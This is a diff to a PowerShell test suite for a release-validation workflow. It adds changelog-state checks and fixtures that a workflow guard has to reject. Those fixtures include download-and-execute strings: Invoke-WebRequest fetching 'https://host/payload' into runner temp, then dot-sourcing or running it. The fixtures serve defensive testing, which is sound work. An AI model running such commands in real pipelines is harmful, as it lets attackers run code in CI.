@@ -20,6 +20,7 @@ function Invoke-ReleaseValidation {
         [Parameter(Mandatory)] [string] $Version,
         [Parameter(Mandatory)] [string] $ChangelogPath,
         [switch] $RequireFinalized,
+        [switch] $RequireUnreleased,
         [switch] $FirstRelease
     )
 
@@ -36,6 +37,7 @@ function Invoke-ReleaseValidation {
         $ChangelogPath
     )
     if ($RequireFinalized) { $arguments += '-RequireFinalized' }
+    if ($RequireUnreleased) { $arguments += '-RequireUnreleased' }
     if ($FirstRelease) { $arguments += '-FirstRelease' }
     $null = Invoke-NestedPwsh -ArgumentList $arguments 2>$null
     return $LASTEXITCODE
@@ -1448,6 +1450,56 @@ fi
         }
     }
 
+    $powerShellCallOperatorBlocks = @(
+        @{
+            Name = 'single-line call-operator block dot-sources a runner-temp script'
+            Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; & { . "' + $workflowRunnerTemp + '\prepare.ps1" }')
+        },
+        @{
+            Name = 'multiline call-operator block invokes a runner-temp executable'
+            Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.exe"' + [Environment]::NewLine +
+                '& {' + [Environment]::NewLine + '    & "' + $workflowRunnerTemp + '\prepare.exe" CHANGELOG.md' + [Environment]::NewLine + '}')
+        },
+        @{
+            Name = 'nested call-operator blocks load a runner-temp script'
+            Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; & { & { . "' + $workflowRunnerTemp + '\prepare.ps1" } }')
+        },
+        @{
+            Name = 'parenthesized call-operator block loads a runner-temp script'
+            Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; & ({ . "' + $workflowRunnerTemp + '\prepare.ps1" })')
+        },
+        @{
+            Name = 'conditional wrapper contains a call-operator script block'
+            Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; if ($true) { & { & "' + $workflowRunnerTemp + '\prepare.ps1" } }')
+        },
+        @{
+            Name = 'call-operator block writes to an artifact output'
+            Text = ('Write-Output safe; & { Set-Content -LiteralPath "' + $workflowRunnerTemp + '\artifacts\rewritten.ps1" -Value "payload" }')
+        },
+        @{
+            Name = 'call-operator block writes to the workspace artifact output'
+            Text = 'Write-Output safe; & { Set-Content -LiteralPath "$env:GITHUB_WORKSPACE\artifacts\rewritten.ps1" -Value "payload" }'
+        }
+    )
+    foreach ($case in $powerShellCallOperatorBlocks) {
+        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
+            $writeText = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\CHANGELOG.md"')
+            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $case.Text -WriteText $writeText -Shell 'pwsh' -Position $position
+            $rejected = $false
+            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'powershell-call-operator-block.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
+            catch { $rejected = $true }
+            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position." }
+        }
+    }
+
+    $callOperatorPinnedScriptControl = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -Runner 'windows-latest' -RunsAfterDownload @(
+        @{ Name = 'Invoke the pinned artifact validator with PowerShell call operator'; Text = 'Write-Output safe; & .\scripts\validate-release-artifact-set.ps1'; Shell = 'pwsh' }
+    )
+    $callOperatorPinnedScriptResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'call-operator-pinned-script-control.yml'; Text = $callOperatorPinnedScriptControl }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('call-operator-pinned-script-control.yml/future-consumer'))
+    if ($callOperatorPinnedScriptResult.Count -ne 1 -or $callOperatorPinnedScriptResult[0].Scripts -notcontains $script) {
+        throw 'A static PowerShell call-operator invocation of a pinned tracked script must remain valid.'
+    }
+
     $staticWindowsScriptFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
         @{ Name = 'Invoke tracked script with Windows separators'; Text = 'pwsh -NoLogo -NoProfile -File .\scripts\validate-release-artifact-set.ps1'; Shell = 'pwsh' }
     )
@@ -2435,9 +2487,7 @@ try {
     if (-not $versionMatch.Success) { throw 'The real packable project has no explicit package version.' }
     $version = $versionMatch.Groups['version'].Value.Trim()
     $realChangelogText = Get-Content -LiteralPath $realChangelog -Raw
-    $releaseHeader = [regex]::Match($realChangelogText, "(?m)^##\s+\[$([regex]::Escape($version))\]\s+-\s+(?<date>\d{4}-\d{2}-\d{2})\s*$")
-    if (-not $releaseHeader.Success) { throw 'The real changelog has no dated entry for the package version.' }
-    $releaseDate = $releaseHeader.Groups['date'].Value
+    if ($realChangelogText -notmatch '(?m)^##\s+\[Unreleased\]\s*$') { throw 'The real changelog has no explicit Unreleased section.' }
 
     if (-not (Test-Path -LiteralPath $ciWorkflowPath -PathType Leaf)) { throw 'CI workflow is missing.' }
     if (-not (Test-Path -LiteralPath $releaseWorkflowPath -PathType Leaf)) { throw 'Release workflow is missing.' }
@@ -2776,12 +2826,14 @@ jobs:
     $wrongCaseDirectory = New-ArtifactSetDirectory 'artifact-set-wrong-case' @("keelmatrix.packagesurface.$version.nupkg", $artifactNames[1])
     Assert-ValidationRejects 'artifact filename case mismatch' (Invoke-ArtifactSetValidation -Version $version -Directory $wrongCaseDirectory)
 
-    # The finalized repository changelog must pass both candidate and first-release tag validation.
-    Assert-ValidationPass 'real finalized candidate' (Invoke-ReleaseValidation -Version $version -ChangelogPath $realChangelog)
-    Assert-ValidationPass 'real finalized first-release tag gate' (Invoke-ReleaseValidation -Version $version -ChangelogPath $realChangelog -RequireFinalized -FirstRelease)
+    # The repository candidate stays unreleased; finalization is tested with an explicit dated fixture.
+    Assert-ValidationPass 'real unreleased candidate' (Invoke-ReleaseValidation -Version $version -ChangelogPath $realChangelog -RequireUnreleased)
+    Assert-ValidationRejects 'unreleased candidate at first-release tag gate' (Invoke-ReleaseValidation -Version $version -ChangelogPath $realChangelog -RequireFinalized -FirstRelease)
+    Assert-ValidationRejects 'conflicting changelog state requirements' (Invoke-ReleaseValidation -Version $version -ChangelogPath $realChangelog -RequireFinalized -RequireUnreleased)
     Assert-ValidationRejects 'local gate empty expected version' (Invoke-LocalGateVersionValidation -Version '')
     Assert-ValidationRejects 'local gate whitespace expected version' (Invoke-LocalGateVersionValidation -Version ' ')
     Assert-ValidationRejects 'local gate mismatched expected version' (Invoke-LocalGateVersionValidation -Version '9.9.9')
+    $releaseDate = [DateTime]::UtcNow.Date.ToString('yyyy-MM-dd', [Globalization.CultureInfo]::InvariantCulture)
 
     $workflowOutputPath = Join-Path $scratch 'github-output'
     $serializedOutput = 'version=' + $version + [Environment]::NewLine
@@ -2813,6 +2865,38 @@ jobs:
     $candidateFirstRelease = "# Changelog`n`n## [Unreleased]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n"
     [IO.File]::WriteAllText($candidateChangelog, $candidateFirstRelease, [Text.UTF8Encoding]::new($false))
     Assert-ValidationPass 'real project with finalized version-consistent first-release changelog' (Invoke-ReleaseValidation -Version $version -ChangelogPath $candidateChangelog -RequireFinalized -FirstRelease)
+
+    $staleReleaseDate = [DateTime]::UtcNow.Date.AddDays(-1).ToString('yyyy-MM-dd', [Globalization.CultureInfo]::InvariantCulture)
+    $staleDateChangelog = Join-Path $scratch 'CHANGELOG.stale-date.md'
+    [IO.File]::WriteAllText($staleDateChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $staleReleaseDate`n`n### Added`n`n- Initial release capability review.`n", [Text.UTF8Encoding]::new($false))
+    Assert-ValidationRejects 'finalized release date from the previous UTC day' (Invoke-ReleaseValidation -Version $version -ChangelogPath $staleDateChangelog -RequireFinalized -FirstRelease)
+
+    $futureReleaseDate = [DateTime]::UtcNow.Date.AddDays(1).ToString('yyyy-MM-dd', [Globalization.CultureInfo]::InvariantCulture)
+    $futureDateChangelog = Join-Path $scratch 'CHANGELOG.future-date.md'
+    [IO.File]::WriteAllText($futureDateChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $futureReleaseDate`n`n### Added`n`n- Initial release capability review.`n", [Text.UTF8Encoding]::new($false))
+    Assert-ValidationRejects 'finalized release date in the next UTC day' (Invoke-ReleaseValidation -Version $version -ChangelogPath $futureDateChangelog -RequireFinalized -FirstRelease)
+
+    $invalidDateChangelog = Join-Path $scratch 'CHANGELOG.invalid-date.md'
+    [IO.File]::WriteAllText($invalidDateChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version] - 2026-02-30`n`n### Added`n`n- Initial release capability review.`n", [Text.UTF8Encoding]::new($false))
+    Assert-ValidationRejects 'finalized release date with invalid calendar day' (Invoke-ReleaseValidation -Version $version -ChangelogPath $invalidDateChangelog -RequireFinalized -FirstRelease)
+
+    $missingDateChangelog = Join-Path $scratch 'CHANGELOG.missing-release-date.md'
+    [IO.File]::WriteAllText($missingDateChangelog, "# Changelog`n`n## [Unreleased]`n`n## [$version]`n`n### Added`n`n- Initial release capability review.`n", [Text.UTF8Encoding]::new($false))
+    Assert-ValidationRejects 'finalized release entry without a date' (Invoke-ReleaseValidation -Version $version -ChangelogPath $missingDateChangelog -RequireFinalized -FirstRelease)
+
+    foreach ($candidateDate in @($staleReleaseDate, $releaseDate, $futureReleaseDate)) {
+        $datedCandidate = Join-Path $scratch ('CHANGELOG.dated-candidate-' + $candidateDate + '.md')
+        [IO.File]::WriteAllText($datedCandidate, "# Changelog`n`n## [Unreleased]`n`n## [$version] - $candidateDate`n`n### Added`n`n- Initial release capability review.`n", [Text.UTF8Encoding]::new($false))
+        Assert-ValidationRejects "candidate with dated target $candidateDate" (Invoke-ReleaseValidation -Version $version -ChangelogPath $datedCandidate -RequireUnreleased)
+    }
+
+    $undatedCandidate = Join-Path $scratch 'CHANGELOG.undated-target.md'
+    [IO.File]::WriteAllText($undatedCandidate, "# Changelog`n`n## [Unreleased]`n`n## [$version]`n`n### Added`n`n- Initial release capability review.`n", [Text.UTF8Encoding]::new($false))
+    Assert-ValidationRejects 'candidate with undated target release section' (Invoke-ReleaseValidation -Version $version -ChangelogPath $undatedCandidate -RequireUnreleased)
+
+    $candidateWithoutNotes = Join-Path $scratch 'CHANGELOG.unreleased-without-notes.md'
+    [IO.File]::WriteAllText($candidateWithoutNotes, "# Changelog`n`n## [Unreleased]`n", [Text.UTF8Encoding]::new($false))
+    Assert-ValidationRejects 'candidate without unreleased target notes' (Invoke-ReleaseValidation -Version $version -ChangelogPath $candidateWithoutNotes -RequireUnreleased)
 
     # Compose the same documentation and release-contract checks used by the
     # publication gate against a concise finalized first-release entry. The
@@ -2892,7 +2976,15 @@ jobs:
     [IO.File]::WriteAllText($mismatchedChangelog, "# Changelog`n`n## [Unreleased]`n`n## [9.9.9] - $releaseDate`n`n- Wrong version.`n", [Text.UTF8Encoding]::new($false))
     Assert-ValidationRejects 'changelog/version disagreement' (Invoke-ReleaseValidation -Version $version -ChangelogPath $mismatchedChangelog -RequireFinalized -FirstRelease)
 
-    Write-Output 'PASS: restored CI/release workflows use one shared fail-closed release contract; real candidate, finalized, and version-mismatch cases behave as required.'
+    $releaseStateTestPath = Join-Path $root 'scripts/test-release-state.ps1'
+    $releaseStateTestOutput = @(Invoke-NestedPwsh -NoLogo -NoProfile -File $releaseStateTestPath 2>&1)
+    $releaseStateTestExitCode = $LASTEXITCODE
+    if ($releaseStateTestExitCode -ne 0) {
+        throw "Focused release-state regression suite failed with exit code ${releaseStateTestExitCode}: $($releaseStateTestOutput -join [Environment]::NewLine)"
+    }
+    $releaseStateTestOutput | ForEach-Object { Write-Output ([string]$_) }
+
+    Write-Output 'PASS: release contract preserves the unreleased candidate state and rejects stale, future, missing, invalid, and mismatched finalized release data.'
 }
 finally {
     if (Test-Path -LiteralPath $scratch) { Remove-Item -LiteralPath $scratch -Recurse -Force }
